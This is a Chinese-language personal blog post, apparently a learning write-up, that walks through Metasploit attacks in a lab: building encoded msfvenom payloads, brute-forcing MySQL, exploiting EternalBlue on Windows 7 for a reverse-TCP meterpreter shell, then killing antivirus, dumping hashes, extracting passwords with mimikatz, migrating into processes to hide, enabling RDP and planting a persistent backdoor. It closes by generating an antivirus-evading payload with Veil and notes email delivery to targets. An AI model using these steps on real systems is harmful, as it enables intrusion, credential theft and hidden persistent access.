<img src="https://i.loli.net/2020/02/17/QYNpkhCnGjgJfcs.png" alt="Snipaste_2020-02-17_10-25-51.png"><br>创建一个攻击载荷如下<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp RHOST=192.168.143.145 --platform windows -a x86 -e x86/shikata_ga_nai -f exe -o test.exe</span><br></pre></td></tr></table></figure>
<img src="https://i.loli.net/2020/02/17/GBLYmWulbzhqZiM.png" alt="Snipaste_2020-02-17_10-32-50.png"><br>其中</li>
</ol>
<p>–platforms 表示平台<br>-o 表示输出文件<br>-p 后面的payload还对RHOST进行了设置。(这里的rhost不是必须设置的，保留这个选项应该是为目标机器多网卡有多个ip设置的)<br><strong>理论上可以通过msfvenom生成的payload作为持久后门免杀使用</strong>截止目前没有接触到这方面知识，以后接触到会继续更新。<br>综合目前学到的知识来看，mvfvenom可以生成免杀的payload，而这个payload可以经过邮件传输之类的方法使目标触发，<br>也可以用作获取meterpreter之后的持久后门</p>
<h1 id="攻击示例"><a href="#攻击示例" class="headerlink" title="攻击示例"></a>攻击示例</h1><p>通过前面的介绍，可以总结出基本的攻击步骤。<br><strong>根据漏洞查找渗透测试模块，搭载payload，设置好选项，就可以开始攻击了</strong></p>
<h2 id="渗透攻击MYSQL数据库服务"><a href="#渗透攻击MYSQL数据库服务" class="headerlink" title="渗透攻击MYSQL数据库服务"></a>渗透攻击MYSQL数据库服务</h2><p>使用mysql_login模块对Mysql数据库服务进行弱密码扫描。<br>这里使用的靶机是metasploitable2<br>打开msfconsole控制台之后</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/mysql/mysql_login</span><br></pre></td></tr></table></figure>
<p>查看选项<br><img src="https://i.loli.net/2020/02/17/cxA4GfFJkltbmSE.png" alt="Snipaste_2020-02-17_12-02-30.png"><br>发现RHOSTS是必须设置的。(没有目标怎么扫呢对吧)<br>还发现了USER_FILE和PASS_FILE。这两个不是必须设置的，但是如果要暴力扫描没有字典那结果通常都是失败的。<br>所以这里先创建两个文件，一个用户名文件user.txt，一个密码文件pass.txt。<br>设置好配置如下<br><img src="https://i.loli.net/2020/02/17/u4ylqNtKi9kOHeo.png" alt="Snipaste_2020-02-17_12-12-15.png"><br>开始扫描，输入exploit即可。<br><img src="https://i.loli.net/2020/02/17/7MOciYoXTw9CDSH.png" alt="Snipaste_2020-02-17_12-13-53.png"><br>可以看到成功登录了。用户名为root，密码为空。</p>
<h2 id="利用ms17-010进行攻击"><a href="#利用ms17-010进行攻击" class="headerlink" title="利用ms17_010进行攻击"></a>利用ms17_010进行攻击</h2><p>这里靶机我是用win7专业版。<br>首先查询可用模块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms17_010</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/02/17/7mtVFq8RwYu1npr.png" alt="Snipaste_2020-02-17_13-32-32.png"><br>可以看到有两个辅助模块三个渗透攻击模块。<br>可以先选择辅助模块进行扫描，也可以直接尝试使用渗透模块(会自己扫一遍)。<br>这里先使用辅助模块扫描一遍</p>
<h3 id="辅助模块扫描"><a href="#辅助模块扫描" class="headerlink" title="辅助模块扫描"></a>辅助模块扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb_ms17_010</span><br></pre></td></tr></table></figure>
<p>按照前面讲的攻击实例做好准备，然后扫描。<br><img src="https://i.loli.net/2020/02/17/AtHUXbmjYPlEshL.png" alt="Snipaste_2020-02-17_13-41-16.png"><br>可以看到扫描结果为易于攻击。目标系统为win7专业版。</p>
<h3 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h3><p><strong>实测安装有火绒安全的时候攻击会被阻断</strong><br>选择exploit</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br></pre></td></tr></table></figure>
<p>使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show payloads</span><br><span class="line">set payload [name]</span><br></pre></td></tr></table></figure>
<p>查看并设置payload。这里的payload选择windows/x64/meterpreter/reverse_tcp<br>选择这个作为payload，一是目标机器是64位的。所以选择x64。<br>二是采用reverse_tcp的方式，不易被拦截(对方主动对外请求)<br><img src="https://i.loli.net/2020/02/17/OpJnf4tMzdwUksH.png" alt="Snipaste_2020-02-17_13-49-45.png"><br>然后设置rhosts(remote hosts)。还有本地监听地址，端口等(目标机器会根据LHOST,LPORT发起连接请求，你总得告诉它往哪连，连哪个端口吧。)<br>设置配置如下。<br><img src="https://i.loli.net/2020/02/17/vuheSWB7Ltp8wgQ.png" alt="Snipaste_2020-02-17_13-56-22.png"><br>开始攻击<br><img src="https://i.loli.net/2020/02/17/s8vin3NtSwzEOTx.png" alt="Snipaste_2020-02-17_13-58-03.png"><br>如果一切顺利应该会拿到一个meterpreter会话，如果失败了:<br>检查配置是否正确<br>然后多试几次(确实有时候会不成功)<br>这时候新开一个命令行，输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -naptul</span><br></pre></td></tr></table></figure>
<p>会发现本机在监听刚才配置的LPORT(本例为4444)<br><img src="https://i.loli.net/2020/02/17/PpdZMOacq9XTYsJ.png" alt="Snipaste_2020-02-17_14-02-33.png"><br>顺带一提udp68是dhcp协议的端口噢~<br>如果此时你打开靶机的cmd工具，输入netstat -nao，会发现自己和攻击者建立的连接<br><img src="https://i.loli.net/2020/02/17/pfcQ8dHrje3lqm9.png" alt="Snipaste_2020-02-17_14-23-37.png"></p>
<h3 id="执行操作"><a href="#执行操作" class="headerlink" title="执行操作"></a>执行操作</h3><p>键入help来查看支持的所有命令<br><img src="https://i.loli.net/2020/02/17/rjNCGsB4QigZxUO.png" alt="Snipaste_2020-02-17_14-28-57.png"><br>注意到有一个run命令。<br>这是比较常用的命令了，仔细看描述，发现后面要执行一个脚本或者Post模块！<br>这里简单介绍一下一些基本操作。</p>
<h4 id="关闭杀软"><a href="#关闭杀软" class="headerlink" title="关闭杀软"></a>关闭杀软</h4><p>一是可以用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run killav</span><br></pre></td></tr></table></figure>
<p>二是可以用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/killav</span><br></pre></td></tr></table></figure>
<h4 id="获取详细信息"><a href="#获取详细信息" class="headerlink" title="获取详细信息"></a>获取详细信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysinfo</span><br></pre></td></tr></table></figure>
<h4 id="检查目标是否运行在虚拟机中"><a href="#检查目标是否运行在虚拟机中" class="headerlink" title="检查目标是否运行在虚拟机中"></a>检查目标是否运行在虚拟机中</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/checkvm</span><br></pre></td></tr></table></figure>
<h4 id="访问文件系统-当前目录"><a href="#访问文件系统-当前目录" class="headerlink" title="访问文件系统(当前目录)"></a>访问文件系统(当前目录)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/02/17/TvuHYZaFLobR2UA.png" alt="Snipaste_2020-02-17_14-57-09.png"></p>
<h4 id="上传下载文件"><a href="#上传下载文件" class="headerlink" title="上传下载文件"></a>上传下载文件</h4><p>上传</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload file</span><br></pre></td></tr></table></figure>
<p>下载</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">download file</span><br></pre></td></tr></table></figure>
<h4 id="屏幕截图"><a href="#屏幕截图" class="headerlink" title="屏幕截图"></a>屏幕截图</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screenshot</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/02/18/jwoODklf5dPHiL7.png" alt="Snipaste_2020-02-18_10-52-45.png"><br>可以看到成功下载了at.exe和桌面的截图</p>
<h4 id="枚举用户"><a href="#枚举用户" class="headerlink" title="枚举用户"></a>枚举用户</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_logged_on_user</span><br></pre></td></tr></table></figure>
<h4 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/02/18/mspqoQ4OXMwaWHI.png" alt="Snipaste_2020-02-18_11-05-03.png"><br>可以看到目标系统只有一个用户名为irrik(那一串长的sid后)</p>
<h4 id="获取用户密码"><a href="#获取用户密码" class="headerlink" title="获取用户密码"></a>获取用户密码</h4><p>获取用户密码哈希</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hasdump</span><br></pre></td></tr></table></figure>
<p>是用mimikatz获取用户密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz</span><br><span class="line">mimikatz_command -f sekurlsa::wdigest -a &quot;full&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/02/18/KfnWToL7MhHUSIN.png" alt="Snipaste_2020-02-18_11-12-40.png"><br>可以看到已经获取到了用户irrik的密码。</p>
<h4 id="绑定进程"><a href="#绑定进程" class="headerlink" title="绑定进程"></a>绑定进程</h4><p>meterpreter可以单独运行也可以绑定进程进行运行<br>但是单独运行比较容易被发现<br>先看看目标系统运行的进程有哪些</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps</span><br></pre></td></tr></table></figure>
<p>选择要绑定的进程</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">migrate pid</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/02/18/W2YK4iEc7Vjtm5B.png" alt="Snipaste_2020-02-18_11-21-48.png"><br>可以看到成功绑定了进程</p>
<h4 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h4><p>语法如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execute [options] -f command</span><br></pre></td></tr></table></figure>
<p>该命令可用的选项和含义如下</p>
<ol>
<li>-H:创建一个隐藏进程</li>
<li>-a:传递给命令的参数</li>
<li>-i:跟进程进行交互</li>
<li>-m:从内存中执行</li>
<li>-t:使用当前伪造的线程令牌运行进程</li>
<li>-s:再给点的会话中执行进程<br><img src="https://i.loli.net/2020/02/18/JKp7EBY5hWUet9s.png" alt="Snipaste_2020-02-18_11-36-11.png"><br><img src="https://i.loli.net/2020/02/18/b7ZRdf4ArtjBGYS.png" alt="Snipaste_2020-02-18_11-36-21.png"><br>可以看到成功执行命令并且在靶机中打开了cmd<h4 id="远程桌面"><a href="#远程桌面" class="headerlink" title="远程桌面"></a>远程桌面</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp</span><br><span class="line">rdesktop rhost</span><br></pre></td></tr></table></figure>
<img src="https://i.loli.net/2020/02/18/qOGATZcUSKrupbM.png" alt="Snipaste_2020-02-18_11-39-14.png"><br>利用我们之前获取的用户密码成功登录桌面<br>要注意，利用这种方法登录对方电脑会将对方挤下线。<h4 id="持久后门"><a href="#持久后门" class="headerlink" title="持久后门"></a>持久后门</h4>meterpreter是基于内存dll建立的连接，所以只要目标主机关机，meterpreter就会断开。<br>为了方便后续渗透方便，可以尝试留下持久后门<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run persistence -X -i 5 -p post -r ip</span><br></pre></td></tr></table></figure>
以上命令含义是</li>
</ol>
<p>-X 当系统启动后自动启动代理<br>-i 重连间隔时间，单位为秒<br>-p 连接的端口<br>-r 连接的ip<br><img src="https://i.loli.net/2020/02/18/DrV7tifbEw5Zosp.png" alt="Snipaste_2020-02-18_11-50-18.png"><br>可以看到写入的payload是<strong>windows/meterpreter/reverse_tcp</strong><br>并且生成了一个vbs脚本，随后执行了这个脚本。<br>接下来就可以在-r指定的主机内开启监听，等待来自目标的连接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
<p>设置了payload之后配置好监听的端口和地址后开始监听。<br>这里要注意的是<strong>handler的payload一定要和目标靶机使用的payload一致，不然连不上</strong><br><img src="https://i.loli.net/2020/02/18/9NdOAPLrcKR4kVj.png" alt="Snipaste_2020-02-18_11-58-40.png"><br>可以看到成功连接上了目标。即使目标重启，只要监听对应端口就可以重新连接靶机获取meterpreter会话</p>
<h1 id="免杀payload"><a href="#免杀payload" class="headerlink" title="免杀payload"></a>免杀payload</h1><p>使用veil-evasion生成免杀payload<br>kali默认没有安装veil-evasion<br>所以需要先</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install veil-evasion</span><br></pre></td></tr></table></figure>
<p>下载完成之后输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">veil</span><br></pre></td></tr></table></figure>
<p>接下来会询问是否安装veil-evasion<br>输入yes然后会clone依赖到本地<br>这个过程可能非常久而且可能会失败<br>如果失败可以多试几次(笔者试了有十次左右)<br>安装过程一直next和接受条款就行了。<br>安装完成之后输入veil如下<br>使用evasion<br><img src="https://i.loli.net/2020/02/18/zaq4jDUxudMYF8i.png" alt="Snipaste_2020-02-18_12-19-10.png"><br>使用方法写得比较清楚了，输入list查看可用的payload<br><img src="https://i.loli.net/2020/02/18/SfbGmiHy3nz8lNQ.png" alt="Snipaste_2020-02-18_12-21-08.png"><br>这里使用cs/meterpreter/rev_tcp.py作为payload<br>接下来的方法其实都差不多了<br>配置一下等待连接的ip，监听端口等等<br><img src="https://i.loli.net/2020/02/18/P16jb7hm4HRgqSV.png" alt="Snipaste_2020-02-18_12-29-06.png"><br>配置好了使用generate生成一下<br>随后输入文件名等待生成<br><img src="https://i.loli.net/2020/02/18/Pb4EUjVOcmyZXHg.png" alt="Snipaste_2020-02-18_12-33-49.png"><br>可以看到生成了一个test1.exe文件(原来有一个test文件了)</p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>在笔者的宿主机上测试了一下<br>把这个payload拷到了宿主机<br>火绒杀毒(过了)<br>双击运行<br>然后在kali使用handler监听<br><img src="https://i.loli.net/2020/02/18/YyO7pHFzDX8djIS.png" alt="Snipaste_2020-02-18_12-44-53.png"><br><img src="https://i.loli.net/2020/02/18/DVoAU1fxb4RJ2va.png" alt="Snipaste_2020-02-18_12-45-31.png"><br>成功获取到了宿主机的meterpreter会话。<br>再强调一下<strong>handler的payload一定要和种在目标靶机中的一样，不然连不了</strong><br>刚才生成的时候使用了cs/meterpreter/rev_tcp.py。对应的就是windows/meterpreter/reverse_tcp这个payload。</p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2020/02/12/buuctf-wp1/" rel="next" title="buuctf-wp">
                <i class="fa fa-chevron-left"></i> buuctf-wp
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2020/02/18/sniff/" rel="prev" title="sniff">
                sniff <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="https://i.loli.net/2019/11/10/UuWBRD8EjChrNIi.jpg"
                alt="irrik" />
            
              <p class="site-author-name" itemprop="name">irrik</p>
              <p class="site-description motion-element" itemprop="description">又菜又爱玩</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/%7C%7C%20archive">
              
                  <span class="site-state-item-count">39</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">8</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/irrik" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-globe"></i>GitHub</a>
                  </span>
                
            </div>
          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Metasploit概述"><span class="nav-number">1.</span> <span class="nav-text">Metasploit概述</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">1.1.</span> <span class="nav-text">Exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#主动渗透攻击"><span class="nav-number">1.1.1.</span> <span class="nav-text">主动渗透攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#被动渗透攻击"><span class="nav-number">1.1.2.</span> <span class="nav-text">被动渗透攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Auxiliary"><span class="nav-number">1.2.</span> <span class="nav-text">Auxiliary</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Post"><span class="nav-number">1.3.</span> <span class="nav-text">Post</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Payload"><span class="nav-number">1.4.</span> <span class="nav-text">Payload</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Single"><span class="nav-number">1.4.1.</span> <span class="nav-text">Single</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Stager"><span class="nav-number">1.4.2.</span> <span class="nav-text">Stager</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Stage"><span class="nav-number">1.4.3.</span> <span class="nav-text">Stage</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NOP"><span class="nav-number">1.5.</span> <span class="nav-text">NOP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Encoder"><span class="nav-number">1.6.</span> <span class="nav-text">Encoder</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Evasion"><span class="nav-number">1.7.</span> <span class="nav-text">Evasion</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Extension"><span class="nav-number">1.8.</span> <span class="nav-text">Extension</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Metasploit终端"><span class="nav-number">2.</span> <span class="nav-text">Metasploit终端</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#初始化Metasploit"><span class="nav-number">2.1.</span> <span class="nav-text">初始化Metasploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#创建工作区"><span class="nav-number">2.2.</span> <span class="nav-text">创建工作区</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#导入扫描报告"><span class="nav-number">2.3.</span> <span class="nav-text">导入扫描报告</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#手动查找攻击载荷"><span class="nav-number">2.4.</span> <span class="nav-text">手动查找攻击载荷</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第三方查找"><span class="nav-number">2.5.</span> <span class="nav-text">第三方查找</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-Details"><span class="nav-number">2.5.1.</span> <span class="nav-text">CVE Details</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exploitDB"><span class="nav-number">2.5.2.</span> <span class="nav-text">exploitDB</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#手动导入第三方模块"><span class="nav-number">2.5.3.</span> <span class="nav-text">手动导入第三方模块</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#攻击准备"><span class="nav-number">2.6.</span> <span class="nav-text">攻击准备</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#设置构架"><span class="nav-number">2.6.1.</span> <span class="nav-text">设置构架</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#设置编码"><span class="nav-number">2.6.2.</span> <span class="nav-text">设置编码</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#攻击示例"><span class="nav-number">3.</span> <span class="nav-text">攻击示例</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#渗透攻击MYSQL数据库服务"><span class="nav-number">3.1.</span> <span class="nav-text">渗透攻击MYSQL数据库服务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用ms17-010进行攻击"><span class="nav-number">3.2.</span> <span class="nav-text">利用ms17_010进行攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#辅助模块扫描"><span class="nav-number">3.2.1.</span> <span class="nav-text">辅助模块扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#开始攻击"><span class="nav-number">3.2.2.</span> <span class="nav-text">开始攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#执行操作"><span class="nav-number">3.2.3.</span> <span class="nav-text">执行操作</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#关闭杀软"><span class="nav-number">3.2.3.1.</span> <span class="nav-text">关闭杀软</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#获取详细信息"><span class="nav-number">3.2.3.2.</span> <span class="nav-text">获取详细信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#检查目标是否运行在虚拟机中"><span class="nav-number">3.2.3.3.</span> <span class="nav-text">检查目标是否运行在虚拟机中</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#访问文件系统-当前目录"><span class="nav-number">3.2.3.4.</span> <span class="nav-text">访问文件系统(当前目录)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#上传下载文件"><span class="nav-number">3.2.3.5.</span> <span class="nav-text">上传下载文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#屏幕截图"><span class="nav-number">3.2.3.6.</span> <span class="nav-text">屏幕截图</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#枚举用户"><span class="nav-number">3.2.3.7.</span> <span class="nav-text">枚举用户</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#权限提升"><span class="nav-number">3.2.3.8.</span> <span class="nav-text">权限提升</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#获取用户密码"><span class="nav-number">3.2.3.9.</span> <span class="nav-text">获取用户密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#绑定进程"><span class="nav-number">3.2.3.10.</span> <span class="nav-text">绑定进程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#运行程序"><span class="nav-number">3.2.3.11.</span> <span class="nav-text">运行程序</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#远程桌面"><span class="nav-number">3.2.3.12.</span> <span class="nav-text">远程桌面</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#持久后门"><span class="nav-number">3.2.3.13.</span> <span class="nav-text">持久后门</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#免杀payload"><span class="nav-number">4.</span> <span class="nav-text">免杀payload</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#测试"><span class="nav-number">4.1.</span> <span class="nav-text">测试</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">irrik</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">174.4k</span>
  
</div>


  <div class="powered-by">
	<i class="fa fa-user-md"></i>
	<span id="busuanzi_container_site_uv">
		本站访客数:<span id="busuanzi_value_site_uv"></span>
	</span>
	<span class="post-meta-divider">|</span>
	<span id="busuanzi_container_site_pv">
		本站访问量<span id="busuanzi_value_site_pv"></span>
	</span>
</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
          <span id="scrollpercent"><span>0</span>%</span>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
